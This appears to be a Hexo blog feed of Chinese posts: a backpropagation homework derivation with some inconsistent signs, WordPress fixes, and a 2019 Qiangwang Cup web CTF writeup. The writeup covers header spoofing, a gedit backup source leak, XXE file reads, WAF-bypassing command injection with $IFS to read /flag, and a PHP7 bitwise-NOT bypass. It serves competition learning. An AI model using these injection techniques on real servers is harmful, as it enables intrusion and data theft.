alt="img"></p><p>过些天再补上心得，2333</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> 比赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> 比赛 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算智能入门作业</title>
      <link href="2019/10/04/%E8%AE%A1%E7%AE%97%E6%99%BA%E8%83%BD%E5%85%A5%E9%97%A8/"/>
      <url>2019/10/04/%E8%AE%A1%E7%AE%97%E6%99%BA%E8%83%BD%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<h3 id="老师布置的作业"><a href="#老师布置的作业" class="headerlink" title="老师布置的作业"></a>老师布置的作业</h3><ol><li>描述 BP 神经网络（BPNN）的训练过程，推导 3 层 BPNN 调整网络权重和偏置量的公式。 </li></ol><h4 id="这公式推导有点难度…"><a href="#这公式推导有点难度…" class="headerlink" title="这公式推导有点难度… :("></a>这公式推导有点难度… :(</h4><p>然后网上查了许多资料，有两个收获:</p><ul><li>神经网络在隐藏层做了什么</li><li>把天天听闻的线性代数对神经网络重要性联系在一起</li></ul><p>隐藏层：该层可以说是神经网络的关键，相当于对数据做一次特征提取。隐藏层的意义，是把前一层的向量变成新的向量。就是坐标变换，说人话就是把数据做平移，旋转，伸缩，扭曲，让数据变得线性可分。可能这个不那么好理解，举个栗子：</p><p>下面的图左侧是原始数据，要把绿点和红点分割开，要怎么做呢？</p><center class="half">    <img src="/img/neutral/1.png" class="lazyload" data-srcset="/img/neutral/1.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" width="250" style="display: inline; margin: 3% 10% 3% 0%;">    <img src="/img/neutral/2.png" class="lazyload" data-srcset="/img/neutral/2.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" width="250" style="display: inline; margin: 3% 0% 3% 0%;"></center><p>上面二图可以<a href="https://cs.stanford.edu/people/karpathy/convnetjs//demo/classify2d.html">在这玩</a></p><p>一种做法：把左图的平面看成一块布，把它缝合成一个闭合的包包（相当于数据变换到了一个3维坐标空间），然后把有绿色点的部分撸到顶部（伸缩和扭曲），然后外围的红色点自然在另一端了，要是姿势还不够帅，就挪挪位置（平移）。这时候干脆利落的砍一刀，绿点红点就彻底区分开了。</p><p>论线性代数的重要性，联系不起来可来这里补课<a href="https://www.bilibili.com/video/av6731067">b站线性代数的本质</a></p><ul><li><p>关于线性变换到3维空间<br>  不同维度的变换是合理的</p><p>  例如下面这个矩阵，它的几何意义就是将二维空间映射到三维空间上<br>  $$<br>  \begin{bmatrix}<br>  3 &amp; 1\<br>  4 &amp; 1\<br>  5 &amp; 9<br>  \end{bmatrix}<br>  $$</p><p>  因为矩阵有两列表面输入空间有两个基向量，<br>  有三行表示每一个基向量在变换后都用三个独立的坐标来描述<br>  所以它们一定落在三维空间中，因此这是一个从二维空间到三维空间的变换</p><p>  不太理解可以看此视频 <a href="https://www.bilibili.com/video/av6731067/?p=4">b站线性代数的本质-第四章</a></p><p>  再如下面这个矩阵<br>  $$<br>  \begin{bmatrix}<br>  3 &amp; 1 &amp; 4\<br>  1 &amp; 5 &amp; 9<br>  \end{bmatrix}<br>  $$<br>  矩阵三列表示原始空间有三个基向量，也就是说原始空间是三维<br>  有两行表明这三个基向量在变换后都仅用两个坐标来描述<br>  所以它们一定落在二维空间中，因此这是一个从三维空间到二维空间的变换</p></li></ul><h4 id="一个二维向量输入到三维向量输出"><a href="#一个二维向量输入到三维向量输出" class="headerlink" title="一个二维向量输入到三维向量输出:"></a>一个二维向量输入到三维向量输出:</h4><p>$$<br>\begin{bmatrix}<br>3\<br>1<br>\end{bmatrix}\rightarrow L\left ( \vec{\nu}  \right ) \rightarrow  \begin{bmatrix}<br>1\<br>8\<br>2<br>\end{bmatrix}<br>$$</p><p>回想线性代数，$ L\left ( \vec{\nu}  \right ) $ 是一个3行2列的矩阵<br>则 $ L\left ( \vec{\nu}  \right ) $ 乘以2行1列(3,1)的矩阵就是以它为基向量作基变换<br>得到的结果就是升维到三维空间后的向量</p><h3 id="吹完水了，开始推导公式…"><a href="#吹完水了，开始推导公式…" class="headerlink" title="# 吹完水了，开始推导公式…"></a># 吹完水了，开始推导公式…</h3><p><a href="https://www.jianshu.com/p/68e6f82d88b7">hexo 支持LaTex参考链接</a></p><ul><li>三层 BPNN 调整网络权重和偏置量的公式分别为<br>$$ \omega_{ij}=\omega_{ij} + \Delta \omega_{ij} = \omega_{ij} + (\eta)O_{i}E_{j} \qquad (1) $$<br>$$ b_{j}=b_{j} + \Delta b_{j} = b_{j} + (\eta)E_{j} \qquad\quad\quad (2) $$<br>  其中：<ul><li>$\omega_{ij}$ 表示输入层到隐含层的权重，$\eta$ 表示学习率</li><li>$O_{i}$ 表示上一层单元i的输出，$E_{j}$ 表示j层神经元误差</li><li>$b_{j}$ 表示j单元偏置量(至于为什么取名为b，下面有提到)</li></ul></li></ul><h5 id="现需要推导-1-2-式子等号成立"><a href="#现需要推导-1-2-式子等号成立" class="headerlink" title="现需要推导(1)(2)式子等号成立"></a>现需要推导(1)(2)式子等号成立</h5><ul><li>先取激活函数<br>$$<br>f(x)=\frac{1}{1+e^{-x}}<br>$$</li></ul><p><img src="/img/neutral/4.png" class="lazyload" data-srcset="/img/neutral/4.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="nstructure"></p><ul><li><p>由上图除了输入层的神经元，每个神经元都会有加权求和得到的输入值 z 和将 z 通过 Sigmoid 函数（也即是激活函数）非线性转化后的输出值 a，他们之间的计算公式如下<br>$$<br>z_{i}^{j}=\sum_{i=1…n}w_{ij}\cdot a_{ij}^{l-1}-b_{j}^{l} \qquad (3)\<br>a_{j}^{l}=f(z_{j}^{(l)})=\frac{1}{1+e^{-z_{j}^{(l)}}} \quad (4)<br>$$</p><p>  式子(3)，是不是和 y = kx + b类似？ 其实b可以理解为线性偏差 (这也是取b为名的原因，方便理解)</p><p>  然后代入到Sigmoid 函数中做非线性变换，做这个变换主要是因为线性模型的表达能力不够(<a href="https://www.zhihu.com/question/22334626">详情请戳我</a>)，其实这个非线性变换也有它的缺点，比如 <a href="https://blog.csdn.net/NOT_GUY/article/details/78749509">梯度消失、不是0均值、不是0均值</a></p></li><li><p>因为输出层的值与真实的值会存在误差，我们可以用均方误差来衡量预测值和真实值之间的误差。<br>$$<br>E=\frac{1}{2}\sum_{j=1}^{l}(Y_{j}^{k}-a_{j}^{l})^{2} \qquad (5)<br>$$</p><p>  其中 $Y_{j}^{k}$ 表示期望输出，是已知量</p><p>  误差肯定是越小越好。因此，我们就要调整w和b值， 使得误差函数的值最小。<br>  要求式子(5) 在两个变量 ( $\omega$ 和 $b$ ) 取不同值时的最值，首先想到的就是求各自的偏导了</p></li></ul><ul><li><p>引入式子(1) 和 (4) 对目标函数 E 求 $\omega$ 和 $b$ 的偏导可以得到 $\omega$ 和 $b$ 的更新量<br>  下面拿求 $\omega$ 偏导来做推导。<br>$$<br>\Delta \omega_{ij} = \eta\frac{\partial E}{\partial w_{hj}} \qquad (6)<br>$$<br>  $\eta$ 学习率取值通常为 0.1 ~ 0.3,可以理解为每次梯度所迈的步伐。<br>  $w_{hj}$为 h 和 j 两层神经元之间的权重<br>  注意到 $w_{hj}$ 的值先影响到第 j 个输出层神经元的输入值 a，再影响到输出值 y</p><p>  根据链式求导法对权重求偏导有：<br>$$<br>\frac{\partial E}{\partial w_{hj}} =\frac{\partial E}{\partial a_{j}^{l}}\cdot \frac{\partial a_{j}^{l}}{\partial z_{j}^{l}}\cdot\frac{\partial z_{j}^{l}}{\partial w_{hj}} \qquad (7)<br>$$</p><p>  由 (3) 有:<br>$$<br>\frac{\partial z_{j}^{l}}{\partial w_{hj}}  = {(\sum_{i=1…n}w_{hj}\cdot a_{hj}^{l-1}-b_{j}^{l})}’ = a_{hj}^{l-1} = O_{i} \qquad (8)<br>$$<br>  与神经网络结构图对应知 $ a_{hj}^{l-1} $ 为上一层单元i的输出 $ O_{i} $</p></li><li><p>Sigmoid 求导的式子如下，<a href="https://ss.csdn.net/p?https://mmbiz.qpic.cn/mmbiz_jpg/ptp8P184xjzr3IibYwltdavich3yf8sbJHO8nFQQiaPX49zKcGg7j8ImL1PW3zZYIy8pQJxXNU3qhwDTeEnx79d5A/640?wx_fmt=jpeg">求导过程请戳我</a><br>$$<br>f{}’(x) = f(x)(1-f(x)) \qquad (9)<br>$$<br>由 (5) 和 (9) 有：<br>$$<br>\frac{\partial E}{\partial a_{j}^{l}}\cdot \frac{\partial a_{j}^{l}}{\partial z_{j}^{l}} = -\frac{1}{2}\cdot 2\cdot (Y_{j}^{k}-a_{j}^{i})\cdot \frac{\partial a_{j}^{l}}{\partial z_{j}^{l}}=a_{j}^{l}\cdot (1-a_{j}^{l})\cdot (Y_{j}^{k}-a_{j}^{l}) =     E_{j} \qquad (10)<br>$$</p></li><li><p>再看看式子 (1) 和 (2) 中的 $E_{j}$，课本给出 关于 $ E_{j} $的公式:<br>$$<br>E_{j} = O_{j}(1-O_{j})(T_{j}-O_{j}) = O_{j}(1-O_{j}))\sum_{k}w_{jk}E_{k}  \qquad (11)<br>$$</p><ul><li>其中 $ T_{j} $ 是输出单元 $j$ 的预期是输出， 即式子 (10) 中的 $ Y_{j}^{k} $ </li><li>$ E_{k} $ 表示它连接的后面一层的单元 $k$ 的误差, 由此看式子 (11) 其实还挺容易理解的：<br>$ O_{j}(1-O_{j}) $ 表示 sigmod函数的偏导，即表示调整误差的速度<br>即 j 层神经元误差是通过预期输出与实际输出的差值和调整误差速度来获取的</li></ul></li></ul><h4 id="激动人心的时候到啦"><a href="#激动人心的时候到啦" class="headerlink" title="激动人心的时候到啦!!"></a>激动人心的时候到啦!!</h4><ul><li>式子 (1)为: $ \omega_{ij}=\omega_{ij} + \Delta \omega_{ij} $</li><li>式子 (6)为: $ \Delta \omega_{ij} = \eta\frac{\partial E}{\partial w_{hj}} $</li><li>式子 (7)为: $ \frac{\partial E}{\partial w_{hj}} =\frac{\partial E}{\partial a_{j}^{l}}\cdot \frac{\partial a_{j}^{l}}{\partial z_{j}^{l}}\cdot\frac{\partial z_{j}^{l}}{\partial w_{hj}} $</li><li>式子 (8) 和 (10) 分别为: $ \frac{\partial z_{j}^{l}}{\partial w_{hj}} = a_{hj}^{l-1} = O_{i} \qquad $  $ \frac{\partial E}{\partial a_{j}^{l}}\cdot \frac{\partial a_{j}^{l}}{\partial z_{j}^{l}} = a_{j}^{l}\cdot (1-a_{j}^{l})\cdot (Y_{j}^{k}-a_{j}^{l}) = E_{j} $</li><li>即: $ \Delta \omega_{ij} = (\eta)O_{i}E_{j} $</li></ul><h4 id="类似也可以证得偏置量公式-b-j-eta-E-j"><a href="#类似也可以证得偏置量公式-b-j-eta-E-j" class="headerlink" title="类似也可以证得偏置量公式 $ b_{j} = -(\eta)E_{j} $"></a>类似也可以证得偏置量公式 $ b_{j} = -(\eta)E_{j} $</h4><h4 id="心累-不过推导完后，感觉还挺好玩的，23333"><a href="#心累-不过推导完后，感觉还挺好玩的，23333" class="headerlink" title="心累,,,不过推导完后，感觉还挺好玩的，23333"></a>心累,,,不过推导完后，感觉还挺好玩的，23333</h4><br><p>参考链接：<br><a href="https://blog.csdn.net/guleileo/article/details/80729775">csdn: zhiyong_will</a><br><a href="https://github.com/edvardHua/Articles/tree/master/%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E4%B8%AD%20BP%20%E7%AE%97%E6%B3%95%E7%9A%84%E5%8E%9F%E7%90%86%E4%B8%8E%20Python%20%E5%AE%9E%E7%8E%B0%E6%BA%90%E7%A0%81%E8%A7%A3%E6%9E%90">github: edvardHua</a><br><a href="https://blog.csdn.net/guleileo/article/details/80729775">csdn: csdn人工智能头条</a></p>]]></content>
      
      
      <categories>
          
          <category> 学校课程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学校课程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>wordpress 常见问题汇总</title>
      <link href="2019/09/23/wordpress_problem/"/>
      <url>2019/09/23/wordpress_problem/</url>
      
        <content type="html"><![CDATA[<h3 id="wordpress升级后后台访问不了"><a href="#wordpress升级后后台访问不了" class="headerlink" title="wordpress升级后后台访问不了"></a>wordpress升级后后台访问不了</h3><p>Cannot Modify Header Information – Headers Already Sent By…….</p><ul><li>解决办法一：在主题目录下functions.php开头加入ob_start()；</li><li>解决办法二：找到sent by后面的.php文件，保存为UTF-8无BOM编码格式;<br>  vim 的话，命令模式输入 :set nobomb 即可转换为UTF-8无BOM编码格式</li></ul><h3 id="wordpress-后台媒体库不显示以及上传错误"><a href="#wordpress-后台媒体库不显示以及上传错误" class="headerlink" title="wordpress 后台媒体库不显示以及上传错误"></a>wordpress 后台媒体库不显示以及上传错误</h3><p>在&lt;!DOCTYPE&gt; 声明之前有其他的代码<br>导致浏览器不能正确识别页面的标准，所以才造成了某些基于html5的特性不能使用。</p><p>参考链接 <a href="https://www.zmki.cn/1428.html">https://www.zmki.cn/1428.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 运维 </category>
          
          <category> Wordpress </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 运维 </tag>
            
            <tag> Wordpress </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2019年第三届广东省强网杯网络安全大赛WEBwriteup</title>
      <link href="2019/09/10/2019qwb/"/>
      <url>2019/09/10/2019qwb/</url>
      
        <content type="html"><![CDATA[<h3 id="八卦"><a href="#八卦" class="headerlink" title="八卦"></a>八卦</h3><p>本次比赛的一个槽点，<br>为什么是在星期一二举行咧…</p><p>由于我只会一点 web ，所以只解出几道 web 题</p><p>Writeby TARITARI</p><h3 id="1-Web-–-小明又被拒绝了"><a href="#1-Web-–-小明又被拒绝了" class="headerlink" title="1. Web – 小明又被拒绝了"></a>1. Web – 小明又被拒绝了</h3><p>看到题目很容易想到改http头，于是抓包。一开始直接改cookie: admin=1无效，后来想了下，小明如果是本地人就不会被拒绝啦！于是用到X-Forwarded-For字段，伪造ip为本地地址127.0.0.1。<br><img src="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C168.png" class="lazyload" data-srcset="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C168.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"><br>提交过去发现不是admin，改好cookie后即可获得flag{xxasdasdd_for}<br><img src="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C218.png" class="lazyload" data-srcset="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C218.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p><h3 id="2-Web-–-XX？"><a href="#2-Web-–-XX？" class="headerlink" title="2. Web – XX？"></a>2. Web – XX？</h3><p>看到题目就想到了xxe，先访问网站发现网站的标题为gedit</p><p><img src="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C262.png" class="lazyload" data-srcset="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C262.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"><br><img src="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C264.png" class="lazyload" data-srcset="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C264.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"><br>然后网上搜了下发现gedit在写完文件后，默认会产生一个以~结尾的备份文件名<br>例如：index.php~。这可用于从服务器中提取源代码/文件。然后御剑扫描发现有三个文件，于是访问index.php~得到源码。哦豁，果然是xxe。<br><img src="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C383.png" class="lazyload" data-srcset="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C383.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p><p>我有一个大胆的想法，flag.php会不会也有呢？<br><img src="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C412.png" class="lazyload" data-srcset="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C412.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"><br>好吧，没有。那我们继续外部实体注入攻击，结合扫描出来的flag.php，得到base64编码。<br><img src="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C462.png" class="lazyload" data-srcset="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C462.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"><br>解码可得flag{IUyasd8213123123890}<br><img src="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C495.png" class="lazyload" data-srcset="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C495.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p><h3 id="3-免费的-ping一下"><a href="#3-免费的-ping一下" class="headerlink" title="3. 免费的,ping一下~"></a>3. 免费的,ping一下~</h3><p>结合题目和页面，是php ping命令执行无误了，ls一下，果然是这样。<br><img src="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C547.png" class="lazyload" data-srcset="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C547.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"><br>然后尝试ls一下根目录，发现waf过滤敏感字符了。于是测试被过滤掉的是空格还是“/“斜杠。<br><img src="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C595.png" class="lazyload" data-srcset="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C595.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"><br>结合网上搜一下，得知中有个变量叫IFS(Internal Field Seprator) ,内部域分隔符，即空格。代替原来的成功执行了。<br><img src="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C666.png" class="lazyload" data-srcset="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C666.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"><br>继续ls得知原来是空格被waf过滤掉了。嘿嘿，那就是可以cat /flag啦，执行以下，然后得知cat 或flag关键字又被过滤了。<br><img src="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C735.png" class="lazyload" data-srcset="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C735.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"><br>由于我偶尔会编写shell脚本，想到用变量拼接可以绕过关键字的过滤。然后一顿猛如虎的操作，结果被告知flag不在第一行。而且他只能显示部分内容。。。<br><img src="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C812.png" class="lazyload" data-srcset="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C812.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"><br>最后使用tail -n 1 /flag 成功获取flag{llllll_U_GeT_Th3_fl4g}<br><img src="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C867.png" class="lazyload" data-srcset="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C867.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p><h3 id="4-php"><a href="#4-php" class="headerlink" title="4. php"></a>4. php</h3><p>访问页面得到一个apache的欢迎页面，于是直接用御剑扫，得到三个文件<br><img src="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C910.png" class="lazyload" data-srcset="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C910.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"><br>访问index.php得知本题为条件绕过型题目。第一眼看过去整个人傻了，无数字字母还好说，可以用异或^，左右移等等去绕过。然后发现取反和自增可以绕过，但是长度只有27，太苛刻了。<br><img src="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C1002.png" class="lazyload" data-srcset="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C1002.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"><br>于是想到，如果这个是php7，那么就可以利用php7的新特性，即可以通过($function)();的方式动态执行函数。<br><a href="https://www.php.net/manual/zh/migration70.incompatible.php">https://www.php.net/manual/zh/migration70.incompatible.php</a><br><img src="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C1199.png" class="lazyload" data-srcset="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C1199.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"><br>取反~符号可以把字母数字符号等等变为不可见字符，就可以轻松绕过正则了，为了被成功解析，使用urlencode一下。</p><p>先copy下来，本地测试，注释掉错误回显，方便调试。先试试phpinfo测试一下，通过 echo urlencode(~”phpinfo”)构造一下。<br><img src="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C1337.png" class="lazyload" data-srcset="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C1337.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p><p>加上(~exp)(); 试试，就发现可以在题目环境中成功执行，接下来就简单了。<br><img src="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C1381.png" class="lazyload" data-srcset="/img/ctf/2019qwb/%E5%B9%BF%E4%B8%9C%E5%90%8D%E8%8F%9C1381.png" 